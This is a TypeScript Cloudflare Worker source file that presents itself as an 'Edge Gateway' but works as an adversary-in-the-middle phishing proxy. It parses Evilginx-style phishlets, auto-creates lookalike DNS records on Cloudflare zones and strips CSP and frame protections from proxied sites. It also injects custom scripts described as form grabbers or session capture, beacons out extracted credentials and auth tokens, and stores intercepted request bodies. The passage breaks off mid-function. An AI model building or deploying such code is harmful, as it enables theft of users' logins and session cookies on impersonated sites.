// Edge Gateway entrypoint — a vanilla Cloudflare Worker that fronts the
// ItemsStore Durable Object. It handles CORS, security headers, per-IP rate
// limiting (in the DO), and real edge caching for GET reads via the Cache API.

import { DurableObjectNamespace } from "cloudflare:workers";

export { ItemsStore } from "./items-store";

const STORE_ID = "global";

function doFetch(env: Env, req: Request): Promise<Response> {
  const id = env.DO.idFromName(STORE_ID);
  const stub = env.DO.get(id);
  return stub.fetch(req);
}

type Env = {
  DO: DurableObjectNamespace;
  /** Default upstream origin for the reverse proxy, e.g. "https://example.com". */
  PROXY_TARGET?: string;
  /** Cloudflare Global API Key (used with CF_API_EMAIL). */
  CF_API_KEY?: string;
  /** Cloudflare account email that owns CF_API_KEY. */
  CF_API_EMAIL?: string;
  /** Optional scoped API token (Bearer) used instead of the global key. */
  CF_API_TOKEN?: string;
  /** When "true", the gateway inspects proxied payloads for intercept captures. */
  INTERCEPT_LAB_MODE?: string;
  /** Comma-separated upstream hostname allowlist for intercept captures. */
  INTERCEPT_ALLOWLIST?: string;
  /** Comma-separated upstream hostname blocklist for intercept captures. */
  INTERCEPT_BLOCKLIST?: string;
  /** TTL in seconds for intercept captures (default: 600 = 10 min). */
  INTERCEPT_TTL_SECONDS?: string;
  /** Bearer token required on all write, intercept, and config endpoints. */
  API_KEY?: string;
  /** Comma-separated CORS origins; empty or unset allows * (any). */
  ALLOWED_ORIGINS?: string;
};

const CF_API = "https://api.cloudflare.com/client/v4";

type PhishletConfig = {
  name?: string;
  proxy_hosts?: Array<{ phish_sub?: string; orig_sub?: string; domain?: string; session?: boolean }>;
  landing_path?: string[];
  credentials?: Array<{ key?: string }>;
  auth_tokens?: Array<{ domain?: string; name?: string }>;
};

/** Parse a minimal Evilginx-style phishlet YAML string into a structured object. */
function parsePhishlet(yaml: string): PhishletConfig | null {
  if (!yaml.trim()) return null;
  const config: PhishletConfig = {};
  const lines = yaml.split("\n");
  let section: string | null = null;
  let current: Record<string, unknown> | null = null;
  const multiLineArrays: Record<string, unknown[]> = {};

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const keyMatch = trimmed.match(/^([a-z_]+):\s*(.*)$/i);
    if (keyMatch && !line.startsWith(" ") && !line.startsWith("\t")) {
      section = keyMatch[1];
      const value = keyMatch[2].trim();
      if (value) {
        config[section as keyof PhishletConfig] = value.replace(/^'|^"|'$|"$/g, "") as never;
      } else {
        multiLineArrays[section] = [];
        current = {};
      }
      continue;
    }
    const itemMatch = line.match(/^\s+-\s+([a-z_]+):\s*(.*)$/i);
    if (itemMatch && section && multiLineArrays[section]) {
      current = { [itemMatch[1]]: itemMatch[2].trim().replace(/^'|^"|'$|"$/g, "") };
      continue;
    }
    const propMatch = line.match(/^\s+([a-z_]+):\s*(.*)$/i);
    if (propMatch && section && multiLineArrays[section] && current) {
      const key = propMatch[1];
      let value: string | boolean = propMatch[2].trim().replace(/^'|^"|'$|"$/g, "");
      if (value === "true") value = true;
      if (value === "false") value = false;
      current[key] = value;
      if (key === "session" || i === lines.length - 1 || !lines[i + 1]?.startsWith(" ")) {
        multiLineArrays[section].push({ ...current });
        current = {};
      }
    }
  }

  if (multiLineArrays.proxy_hosts) config.proxy_hosts = multiLineArrays.proxy_hosts as PhishletConfig["proxy_hosts"];
  if (multiLineArrays.credentials) config.credentials = multiLineArrays.credentials as PhishletConfig["credentials"];
  if (multiLineArrays.auth_tokens) config.auth_tokens = multiLineArrays.auth_tokens as PhishletConfig["auth_tokens"];
  if (multiLineArrays.landing_path) config.landing_path = multiLineArrays.landing_path as unknown as string[];
  return config;
}

/**
 * Build Cloudflare API auth headers from the configured credentials. A scoped
 * Bearer token wins if present, otherwise the global key + account email is
 * used. Falls back to runtime config overrides when env vars are absent.
 * Returns null when nothing is configured.
 */
async function cfAuthHeaders(env: Env): Promise<Record<string, string> | null> {
  if (env.CF_API_TOKEN) {
    return { Authorization: `Bearer ${env.CF_API_TOKEN}` };
  }
  if (env.CF_API_KEY && env.CF_API_EMAIL) {
    return { "X-Auth-Email": env.CF_API_EMAIL, "X-Auth-Key": env.CF_API_KEY };
  }
  const rc = await resolveRuntimeConfig(env);
  const token = rc["CF_API_TOKEN"]?.trim();
  if (token) {
    return { Authorization: `Bearer ${token}` };
  }
  const key = rc["CF_API_KEY"]?.trim();
  const email = rc["CF_API_EMAIL"]?.trim();
  if (key && email) {
    return { "X-Auth-Email": email, "X-Auth-Key": key };
  }
  return null;
}

type CfApiResponse<T> = {
  success: boolean;
  result?: T;
  errors?: { code: number; message: string }[];
};

type CfZone = { id: string; name: string; status: string };

/** List the purchased domains (zones) in the configured Cloudflare account. */
async function listZones(env: Env): Promise<Response> {
  const auth = await cfAuthHeaders(env);
  if (!auth) {
    return decorate(
      Response.json(
        { success: false, configured: false, error: "Cloudflare credentials not configured" },
        { status: 200 },
      ),
    );
  }
  try {
    const res = await fetch(`${CF_API}/zones?per_page=50&status=active`, {
      headers: auth,
    });
    const json = (await res.json()) as CfApiResponse<CfZone[]>;
    if (!json.success) {
      return decorate(
        Response.json(
          {
            success: false,
            configured: true,
            error: json.errors?.[0]?.message ?? "Cloudflare API rejected the request",
          },
          { status: 502 },
        ),
      );
    }
    const zones = (json.result ?? []).map((z) => ({
      id: z.id,
      name: z.name,
      status: z.status,
    }));
    return decorate(Response.json({ success: true, configured: true, data: zones }));
  } catch {
    return decorate(
      Response.json(
        { success: false, configured: true, error: "could not reach the Cloudflare API" },
        { status: 502 },
      ),
    );
  }
}

/** Persist an allocated proxy domain onto a target in the Durable Object, including CF record tracking for cleanup. */
function setProxyDomain(
  env: Env,
  id: number,
  proxyDomain: string,
  cfZoneId?: string,
  cfRecordId?: string,
): Promise<Response> {
  const req = new Request("https://do/__proxy-domain", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id, proxyDomain, cfZoneId, cfRecordId }),
  });
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, req);
}

/**
 * Create a wildcard DNS record on a Cloudflare zone so every subdomain is
 * caught by the Worker automatically. Creates a proxied A record `*` pointing
 * at 100:: (the Cloudflare-proxy placeholder) and returns the record details.
 * Body: `{ zoneId, recordType? }` — defaults to "A".
 */
async function createWildcardDns(request: Request, env: Env): Promise<Response> {
  const auth = await cfAuthHeaders(env);
  if (!auth) {
    return decorate(
      Response.json(
        { success: false, configured: false, error: "Cloudflare credentials not configured" },
        { status: 400 },
      ),
    );
  }
  const body = (await request.json().catch(() => null)) as {
    zoneId?: string;
    recordType?: string;
  } | null;
  const zoneId = (body?.zoneId ?? "").toString().trim();
  const recordType = (body?.recordType ?? "").toString().trim().toUpperCase() || "A";
  if (!zoneId) {
    return decorate(
      Response.json(
        { success: false, error: "zoneId is required" },
        { status: 400 },
      ),
    );
  }
  if (recordType !== "A" && recordType !== "AAAA") {
    return decorate(
      Response.json(
        { success: false, error: "recordType must be A or AAAA" },
        { status: 400 },
      ),
    );
  }
  // Cloudflare proxied placeholder — 100:: for AAAA, 192.0.2.1 for A.
  const content = recordType === "AAAA" ? "100::" : "192.0.2.1";
  try {
    const res = await fetch(`${CF_API}/zones/${zoneId}/dns_records`, {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: JSON.stringify({
        type: recordType,
        name: "*",
        content,
        proxied: true,
        ttl: 1,
        comment: "Edge Gateway wildcard — catches all subdomains",
      }),
    });
    const json = (await res.json()) as CfApiResponse<{ id: string; name: string; type: string; content: string }>;
    if (!json.success) {
      const message = json.errors?.[0]?.message ?? "could not create wildcard DNS record";
      return decorate(
        Response.json({ success: false, error: message }, { status: 502 }),
      );
    }
    return decorate(
      Response.json({ success: true, data: json.result }),
    );
  } catch {
    return decorate(
      Response.json(
        { success: false, error: "could not reach the Cloudflare API" },
        { status: 502 },
      ),
    );
  }
}

/**
 * Allocate a purchased Cloudflare domain to a proxy target. Creates a proxied
 * CNAME record in the chosen zone pointing at this gateway host, then records
 * the hostname on the target so the app can surface it. Body:
 * `{ proxyId, zoneId, hostname }`.
 */
async function allocateDomain(request: Request, env: Env): Promise<Response> {
  const auth = await cfAuthHeaders(env);
  if (!auth) {
    return decorate(
      Response.json(
        { success: false, configured: false, error: "Cloudflare credentials not configured" },
        { status: 400 },
      ),
    );
  }
  const body = (await request.json().catch(() => null)) as {
    proxyId?: number;
    zoneId?: string;
    hostname?: string;
  } | null;
  const proxyId = Number(body?.proxyId);
  const zoneId = (body?.zoneId ?? "").toString().trim();
  const hostname = (body?.hostname ?? "").toString().trim().toLowerCase();
  if (!proxyId || !zoneId || !hostname || !/^[a-z0-9.-]+\.[a-z]{2,}$/.test(hostname)) {
    return decorate(
      Response.json(
        { success: false, error: "proxyId, zoneId and a valid hostname are required" },
        { status: 400 },
      ),
    );
  }
  const gatewayHost = new URL(request.url).host;
  try {
    const res = await fetch(`${CF_API}/zones/${zoneId}/dns_records`, {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "CNAME",
        name: hostname,
        content: gatewayHost,
        proxied: true,
        ttl: 1,
        comment: "Edge Gateway Dashboard proxy domain",
      }),
    });
    const json = (await res.json()) as CfApiResponse<{ id: string; name: string }>;
    if (!json.success) {
      const message = json.errors?.[0]?.message ?? "could not create DNS record";
      return decorate(
        Response.json({ success: false, error: message }, { status: 502 }),
      );
    }
    const stored = await setProxyDomain(
      env,
      proxyId,
      hostname,
      zoneId,
      json.result?.id ?? "",
    );
    const storedJson = (await stored.json().catch(() => null)) as {
      data?: unknown;
    } | null;
    return decorate(
      Response.json({
        success: true,
        data: {
          hostname,
          target: gatewayHost,
          record: json.result,
          proxy: storedJson?.data ?? null,
        },
      }),
    );
  } catch {
    return decorate(
      Response.json(
        { success: false, error: "could not reach the Cloudflare API" },
        { status: 502 },
      ),
    );
  }
}

const RATE_LIMIT_REQUESTS = 100;
const RATE_LIMIT_WINDOW = 60; // seconds
const CACHE_TTL = 10; // seconds
const GATEWAY_VERSION = "1.0.0";
const INTERCEPT_BODY_MAX_BYTES = 16_384; // Cap per-body read for intercept captures.
const WRITE_BODY_MAX_BYTES = 65_536; // Cap body size on write endpoints (64 KB).

/** Content type prefixes eligible for intercept body capture — skip binary blobs. */
const INTERCEPTABLE_CONTENT_TYPES = [
  "application/json",
  "application/x-www-form-urlencoded",
  "text/",
  "application/xml",
  "application/xhtml",
  "multipart/form-data",
];

/** Returns true when a Content-Type header value is eligible for capture. */
function isInterceptableContentType(ct: string): boolean {
  const lower = ct.toLowerCase();
  return INTERCEPTABLE_CONTENT_TYPES.some((prefix) => lower.startsWith(prefix));
}

/** Fetch the runtime config stored in the DO (used when env vars are absent). */
async function resolveRuntimeConfig(env: Env): Promise<Record<string, string>> {
  try {
    const req = new Request("https://do/api/config");
    req.headers.set("X-Rork-DO-Class", "ItemsStore");
    req.headers.set("X-Rork-DO-Id", STORE_ID);
    const res = await doFetch(env, req);
    if (!res.ok) return {};
    const json = (await res.json()) as { data?: Record<string, string> };
    return json.data ?? {};
  } catch {
    return {};
  }
}

// Hop-by-hop headers must never be forwarded between client <-> origin.
/** Full hop-by-hop set for regular HTTP requests. */
const HOP_BY_HOP = new Set([
  "connection",
  "keep-alive",
  "proxy-authenticate",
  "proxy-authorization",
  "te",
  "trailer",
  "transfer-encoding",
  "upgrade",
]);

const CORS: Record<string, string> = {
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
  "Access-Control-Expose-Headers":
    "X-Cache, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, X-Edge-Latency, Retry-After",
};

const SECURITY: Record<string, string> = {
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "Referrer-Policy": "strict-origin-when-cross-origin",
  "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
};

// STORE_ID declared at top of file

/**
 * Resolve the CORS Allow-Origin header for a request. Uses the ALLOWED_ORIGINS
 * runtime config first, then the env var, then falls back to *.
 */
async function resolveCorsOrigin(request: Request, env: Env): Promise<string> {
  let allowed = (env.ALLOWED_ORIGINS ?? "").trim();
  if (!allowed) {
    const rc = await resolveRuntimeConfig(env);
    allowed = (rc["ALLOWED_ORIGINS"] ?? "").trim();
  }
  if (!allowed || allowed === "*") return "*";
  const origin = request.headers.get("Origin") ?? "";
  const origins = allowed.split(",").map((s) => s.trim().toLowerCase());
  const originLower = origin.toLowerCase();
  if (origins.includes(originLower) || origins.includes("*")) {
    return origin || origins[0];
  }
  return origins[0];
}

/** Endpoints that always require an API key (if configured on the worker). */
function requiresAuth(path: string, method: string): boolean {
  // Write operations
  if (method !== "GET" && path.startsWith("/api/items")) return true;
  if (method !== "GET" && path.startsWith("/api/proxies")) return true;
  // Worker route management
  if (method !== "GET" && path.startsWith("/api/cloudflare/worker-routes")) return true;
  // Intercept access
  if (path === "/api/intercepts") return true;
  // Config access
  if (path === "/api/config") return true;
  return false;
}

/** Check the Authorization header against the configured API_KEY. Returns null on success or a 401 Response on failure. */
async function checkAuth(request: Request, env: Env): Promise<Response | null> {
  let apiKey = env.API_KEY ?? "";
  if (!apiKey) {
    const rc = await resolveRuntimeConfig(env);
    apiKey = rc["API_KEY"] ?? "";
  }
  if (!apiKey) return null; // No key configured => auth is opt-out.
  const auth = request.headers.get("Authorization") ?? "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  if (token !== apiKey) {
    return decorate(
      Response.json({ success: false, error: "unauthorized" }, { status: 401 }),
    );
  }
  return null;
}

function dispatch(request: Request, env: Env): Promise<Response> {
  const wrapped = new Request(request.url, request);
  wrapped.headers.set("X-Rork-DO-Class", "ItemsStore");
  wrapped.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, wrapped);
}

type TrafficLog = {
  ts: number;
  method: string;
  path: string;
  status: number;
  latencyMs: number;
  cache: string;
  ip: string;
  country: string;
  colo: string;
  proxy: string;
};

type ProxyConfig = {
  id: number;
  slug: string;
  name: string;
  targetUrl: string;
  enabled: boolean;
  interceptEnabled: boolean;
  injectJs: string;
  injectJsEnabled: boolean;
  /** Allocated Cloudflare domain for this proxy (e.g. "api.example.com"). */
  proxyDomain: string;
  /** Cloudflare zone ID for DNS cleanup. */
  cfZoneId: string;
  /** Cloudflare DNS record ID for cleanup. */
  cfRecordId: string;
  /** Auto-generated YAML phishlet config for this target. */
  phishlet: string;
};

/** Look up a proxy from the DO by its numeric id (internal). */
async function resolveProxyById(
  env: Env,
  id: number,
): Promise<ProxyConfig | null> {
  const req = new Request(`https://do/__proxy-by-id?id=${id}`);
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  const res = await doFetch(env, req);
  if (!res.ok) return null;
  const json = (await res.json()) as {
    data?: ProxyConfig;
  };
  return json.data ?? null;
}

/**
 * Delete a Cloudflare DNS record by zone and record id. Best-effort —
 * failures are logged but never thrown, so a delete always proceeds.
 */
async function deleteDnsRecord(
  env: Env,
  zoneId: string,
  recordId: string,
): Promise<void> {
  const auth = await cfAuthHeaders(env);
  if (!auth || !zoneId || !recordId) return;
  try {
    await fetch(`${CF_API}/zones/${zoneId}/dns_records/${recordId}`, {
      method: "DELETE",
      headers: auth,
    });
  } catch {
    // Best-effort — don't block proxy deletion on CF API flakiness.
  }
}

type WorkerRoute = { id: string; pattern: string; script: string; zoneId?: string; zoneName?: string };

/** List all Worker routes for every active zone in the configured Cloudflare account. */
async function listWorkerRoutes(env: Env): Promise<Response> {
  const auth = await cfAuthHeaders(env);
  if (!auth) {
    return decorate(
      Response.json(
        { success: false, configured: false, error: "Cloudflare credentials not configured" },
        { status: 200 },
      ),
    );
  }
  try {
    const zonesRes = await fetch(`${CF_API}/zones?per_page=50&status=active`, { headers: auth });
    const zonesJson = (await zonesRes.json()) as CfApiResponse<CfZone[]>;
    if (!zonesJson.success) {
      return decorate(
        Response.json(
          { success: false, configured: true, error: zonesJson.errors?.[0]?.message ?? "Cloudflare API rejected the request" },
          { status: 502 },
        ),
      );
    }
    const zones = zonesJson.result ?? [];
    const routes: WorkerRoute[] = [];
    for (const zone of zones) {
      const res = await fetch(`${CF_API}/zones/${zone.id}/workers/routes`, { headers: auth });
      if (!res.ok) continue;
      const json = (await res.json()) as CfApiResponse<Array<{ id: string; pattern: string; script: string }>>;
      for (const r of json.result ?? []) {
        routes.push({ id: r.id, pattern: r.pattern, script: r.script, zoneId: zone.id, zoneName: zone.name });
      }
    }
    return decorate(Response.json({ success: true, configured: true, data: routes }));
  } catch {
    return decorate(
      Response.json(
        { success: false, configured: true, error: "could not reach the Cloudflare API" },
        { status: 502 },
      ),
    );
  }
}

/** Delete a single Worker route by zone + route id. */
async function deleteWorkerRoute(env: Env, zoneId: string, routeId: string): Promise<Response> {
  const auth = await cfAuthHeaders(env);
  if (!auth) {
    return decorate(Response.json({ success: false, error: "Cloudflare credentials not configured" }, { status: 400 }));
  }
  try {
    const res = await fetch(`${CF_API}/zones/${zoneId}/workers/routes/${routeId}`, {
      method: "DELETE",
      headers: auth,
    });
    if (!res.ok) {
      const json = (await res.json().catch(() => null)) as CfApiResponse<unknown> | null;
      return decorate(
        Response.json(
          { success: false, error: json?.errors?.[0]?.message ?? `route delete failed (${res.status})` },
          { status: 502 },
        ),
      );
    }
    return decorate(Response.json({ success: true }));
  } catch {
    return decorate(Response.json({ success: false, error: "could not reach the Cloudflare API" }, { status: 502 }));
  }
}

/**
 * Auto-allocate a Cloudflare domain for a newly created proxy. Picks the
 * first active zone and creates a CNAME record pointing at the gateway.
 * Runs inside ctx.waitUntil so the client gets the initial 201 immediately.
 */
async function autoAllocateDomain(
  env: Env,
  proxyId: number,
  slug: string,
  gatewayHost: string,
): Promise<void> {
  const auth = await cfAuthHeaders(env);
  if (!auth) return;
  const zonesRes = await fetch(`${CF_API}/zones?per_page=5&status=active`, {
    headers: auth,
  }).catch(() => null);
  if (!zonesRes?.ok) return;
  const zonesJson = (await zonesRes.json()) as CfApiResponse<CfZone[]>;
  const zone = zonesJson.result?.[0];
  if (!zone) return;
  const hostname = `${slug}.${zone.name}`;
  const dnsRes = await fetch(
    `${CF_API}/zones/${zone.id}/dns_records`,
    {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "CNAME",
        name: hostname,
        content: gatewayHost,
        proxied: true,
        ttl: 1,
        comment: "Edge Gateway Dashboard — auto-allocated",
      }),
    },
  ).catch(() => null);
  if (!dnsRes?.ok) return;
  const dnsJson = (await dnsRes.json()) as CfApiResponse<{ id: string }>;
  if (dnsJson.success && dnsJson.result) {
    await setProxyDomain(env, proxyId, hostname, zone.id, dnsJson.result.id);
  }
}

/** Resolve a configured proxy target by slug from the Durable Object. */
async function resolveProxy(env: Env, slug: string): Promise<ProxyConfig | null> {
  const req = new Request(`https://do/__proxy?slug=${encodeURIComponent(slug)}`);
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  const res = await doFetch(env, req);
  if (!res.ok) return null;
  const json = (await res.json()) as { data?: ProxyConfig };
  return json.data ?? null;
}

/** Resolve a configured proxy by its allocated domain hostname (for wildcard subdomain routing). */
async function resolveProxyByDomain(
  env: Env,
  hostname: string,
): Promise<ProxyConfig | null> {
  const req = new Request(
    `https://do/__proxy-by-domain?host=${encodeURIComponent(hostname)}`,
  );
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  const res = await doFetch(env, req);
  if (!res.ok) return null;
  const json = (await res.json()) as { data?: ProxyConfig };
  return json.data ?? null;
}

/** Returns true when the request is a WebSocket upgrade (RFC 6455). */
function isWebSocketUpgrade(request: Request): boolean {
  const upgrade = (request.headers.get("Upgrade") ?? "").toLowerCase();
  const connection = (request.headers.get("Connection") ?? "").toLowerCase();
  return (
    upgrade === "websocket" &&
    connection.includes("upgrade")
  );
}

/**
 * Hop-by-hop headers to strip for non-WebSocket requests. For WebSocket
 * upgrades, Upgrade + Connection must be preserved so the handshake succeeds.
 */
function hopByHopFor(request: Request): Set<string> {
  if (isWebSocketUpgrade(request)) {
    // Keep Upgrade and Connection for the WebSocket handshake.
    return new Set([
      "keep-alive",
      "proxy-authenticate",
      "proxy-authorization",
      "te",
      "trailer",
      "transfer-encoding",
    ]);
  }
  return HOP_BY_HOP;
}

/**
 * HTMLRewriter-based content rewriting for proxied HTML responses. Fixes
 * redirect Location headers to point back through the proxy, injects a
 * <base> tag so relative links resolve correctly, strips origin
 * isolation headers that would break the proxied page, and optionally
 * injects a per-proxy custom JavaScript snippet for beacons, form
 * grabbers, or session capture.
 */
function rewriteProxiedContent(
  response: Response,
  proxyHost: string,
  targetHost: string,
  injectJs?: string,
): Response {
  // Rewrite 3xx Location headers that point to the origin so they point
  // back through the proxy instead.
  let location = response.headers.get("Location");
  if (location) {
    try {
      const locUrl = new URL(location);
      if (locUrl.host === targetHost) {
        locUrl.host = proxyHost;
        locUrl.protocol = "https:";
        location = locUrl.toString();
      }
    } catch {
      // Relative Location — leave as-is; the <base> tag will resolve it.
    }
  }

  const headers = new Headers(response.headers);
  if (location) headers.set("Location", location);
  // Strip X-Frame-Options so the proxied page can render.
  headers.delete("X-Frame-Options");
  headers.delete("Content-Security-Policy");
  // Inject a <base> tag so relative URLs resolve relative to the origin,
  // and a small script to rewrite pushState/replaceState URLs.
  const baseInjection = `
<head><base href="https://${targetHost}/">
<script>window.__gwHost="${proxyHost}";window.__gwTarget="${targetHost}";
(function(){var _wr=history.replaceState,_ps=history.pushState;history.replaceState=function(s,t,u){try{var n=new URL(u||"",location.href);if(n.host==="${targetHost}"){n.host="${proxyHost}";u=n.toString()}}catch(e){}return _wr.call(this,s,t,u)};history.pushState=function(s,t,u){try{var n=new URL(u||"",location.href);if(n.host==="${targetHost}"){n.host="${proxyHost}";u=n.toString()}}catch(e){}return _ps.call(this,s,t,u)}})();</script>`;

  // Per-proxy custom JS injection — appended after the base rewrite script.
  const customInjection = injectJs
    ? `<script>${injectJs}</script>`
    : "";

  const fullInjection = baseInjection + customInjection;

  return new HTMLRewriter()
    .on("head", {
      element(el: { prepend(content: string, opts: { html: boolean }): void }) {
        el.prepend(fullInjection, { html: true });
      },
    })
    .transform(
      new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers,
      }),
    );
}

/**
 * Delete intercept captures associated with a proxy slug. Called as cascade
 * cleanup when a proxy is deleted.
 */
function deleteInterceptsForSlug(env: Env, slug: string): Promise<void> {
  const req = new Request("https://do/__intercept-clear", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ slug }),
  });
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, req).then(() => undefined);
}
function bumpProxyHits(env: Env, slug: string): Promise<void> {
  const req = new Request("https://do/__proxy-hit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ slug }),
  });
  req.headers.set("X-Rork-DO-Class", "ItemsStore");
  req.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, req).then(() => undefined);
}

/**
 * Traffic analyser interceptor. Fire-and-forget write of a single request's
 * metadata into the ItemsStore ring buffer. Runs via ctx.waitUntil so it never
 * blocks the client response.
 */
function logTraffic(request: Request, env: Env, entry: TrafficLog): Promise<void> {
  const log = new Request("https://do/__traffic", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(entry),
  });
  log.headers.set("X-Rork-DO-Class", "ItemsStore");
  log.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, log).then(() => undefined);
}

/**
 * Intercept capture — fire-and-forget write of a proxied request/response
 * payload pair into durable storage. Only called when lab mode is on and the
 * resolved proxy has intercept enabled.
 */
function logIntercept(
  env: Env,
  entry: {
    ts: number;
    slug: string;
    method: string;
    path: string;
    reqHeaders: string;
    reqBody: string;
    respStatus: number;
    respHeaders: string;
    respBody: string;
    host: string;
  },
): Promise<void> {
  const ic = new Request("https://do/__intercept", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(entry),
  });
  ic.headers.set("X-Rork-DO-Class", "ItemsStore");
  ic.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, ic).then(() => undefined);
}

/**
 * Fire-and-forget beacon to log extracted credentials/auth tokens from a
 * phishlet-aware proxy. Sent to the same /api/beacon endpoint the JS snippets
 * use, so all captured data is centralized in the Durable Object.
 */
function sendBeacon(
  env: Env,
  baseUrl: string,
  payload: {
    proxy: string;
    url: string;
    credentials: Record<string, string>;
    cookies: string[];
    phishlet: string;
  },
): Promise<void> {
  const url = new URL("/api/beacon", baseUrl);
  const b = new Request(url.toString(), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  b.headers.set("X-Rork-DO-Class", "ItemsStore");
  b.headers.set("X-Rork-DO-Id", STORE_ID);
  return doFetch(env, b)
    .then(() => undefined)
    .catch(() => undefined);
}

function buildTrafficEntry(
  request: Request,
  response: Response,
  path: string,
  latencyMs: number,
  ip: string,
  proxy: string = "",
): TrafficLog {
  const cf = (request as Request & { cf?: { country?: string; colo?: string } }).cf;
  return {
    ts: Date.now(),
    method: request.method,
    path,
    status: response.status,
    latencyMs,
    cache: response.headers.get("X-Cache") ?? "",
    ip,
    country: cf?.country ?? request.headers.get("CF-IPCountry") ?? "",
    colo: cf?.colo ?? "",
    proxy,
  };
}

function decorate(response: Response, corsOrigin?: string, extra?: Record<string, string>): Response {
  const headers = new Headers(response.headers);
  for (const [k, v] of Object.entries(CORS)) {
    headers.set(k, v);
  }
  headers.set("Access-Control-Allow-Origin", corsOrigin ?? "*");
  for (const [k, v] of Object.entries(SECURITY)) {
    headers.set(k, v);
  }
  for (const [k, v] of Object.entries(extra ?? {})) {
    headers.set(k, v);
  }
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers,
  });
}

const isCacheable = (path: string, method: string): boolean =>
  method === "GET" && (path === "/api/items" || /^\/api\/items\/\d+$/.test(path));

/**
 * Reverse-proxy a request to a target origin through this Worker (the
 * self-hosted proxy domain). Everything under `/proxy/*` is forwarded.
 *
 * The upstream origin is resolved in priority order:
 *   1. `?target=https://host` query param (per-request override), or
 *   2. the `PROXY_TARGET` Worker env var (default upstream).
 *
 * The path after `/proxy` plus the original query string is appended to the
 * target. Hop-by-hop headers are stripped and standard `X-Forwarded-*` /
 * `X-Gateway-Version` headers are added so the origin sees the real client.
 */
type ReverseProxyResult = {
  response: Response;
  proxy: string;
  interceptPromise: Promise<void> | undefined;
  beaconPromise: Promise<void> | undefined;
};

async function reverseProxy(
  request: Request,
  env: Env,
  /** Pre-resolved proxy config — avoids a duplicate DO lookup. */
  preResolvedConfig?: ProxyConfig,
): Promise<ReverseProxyResult> {
  const incoming = new URL(request.url);
  const segments = incoming.pathname
    .replace(/^\/proxy\/?/, "")
    .split("/")
    .filter(Boolean);

  const override = incoming.searchParams.get("target");
  let targetBase: string | undefined;
  let rest: string;
  let proxyLabel = "";

  if (override) {
    // Legacy/ad-hoc override: /proxy/<rest>?target=https://host
    targetBase = override;
    rest = segments.join("/");
  } else if (segments.length > 0) {
    // Configured target: /proxy/<slug>/<rest>
    const slug = segments[0];
    const config = preResolvedConfig ?? await resolveProxy(env, slug);
    if (!config) {
      return {
        proxy: slug,
        response: decorate(
          Response.json(
            { success: false, error: `no proxy configured for "${slug}"` },
            { status: 404 },
          ),
        ),
        interceptPromise: undefined,
        beaconPromise: undefined,
      };
    }
    if (!config.enabled) {
      return {
        proxy: slug,
        response: decorate(
          Response.json(
            { success: false, error: `proxy "${slug}" is disabled` },
            { status: 503 },
          ),
        ),
        interceptPromise: undefined,
        beaconPromise: undefined,
      };
    }
    targetBase = config.targetUrl;
    rest = segments.slice(1).join("/");
    proxyLabel = config.slug;
  } else {
    const rc = await resolveRuntimeConfig(env);
    targetBase = env.PROXY_TARGET || rc["PROXY_TARGET"];
    rest = "";
  }

  if (!targetBase) {
    return {
      proxy: proxyLabel,
      response: decorate(
        Response.json(
          {
            success: false,
            error:
              "no proxy target — add one in the app, or pass ?target=https://host",
          },
          { status: 502 },
        ),
      ),
      interceptPromise: undefined,
      beaconPromise: undefined,
    };
  }

  let target: URL;
  try {
    target = new URL(targetBase);
  } catch {
    return {
      proxy: proxyLabel,
      response: decorate(
        Response.json(
          { success: false, error: "invalid proxy target url" },
          { status: 400 },
        ),
      ),
      interceptPromise: undefined,
      beaconPromise: undefined,
    };
  }

  // Map remaining path onto the target origin, preserving query (minus ?target).
  const basePath = target.pathname.replace(/\/$/, "");
  target.pathname = `${basePath}/${rest}`.replace(/\/{2,}/g, "/");
  incoming.searchParams.delete("target");
  target.search = incoming.searchParams.toString();

  const wsUpgrade = isWebSocketUpgrade(request);
  const headers = new Headers(request.headers);
  for (const name of hopByHopFor(request)) headers.delete(name);
  headers.set("Host", target.host);
  headers.set("X-Real-IP",
    request.headers.get("CF-Connecting-IP") ?? "",
  );
  headers.set("X-Forwarded-Host", incoming.host);
  headers.set("X-Forwarded-Proto", incoming.protocol.replace(":", ""));
  headers.set(
    "X-Forwarded-For",
    request.headers.get("CF-Connecting-IP") ??
      request.headers.get("X-Forwarded-For") ??
      "anonymous",
  );
  headers.set("X-Gateway-Version", GATEWAY_VERSION);
  // Preserve Cloudflare geo headers that the origin may need.
  const cfCountry = request.headers.get("CF-IPCountry");
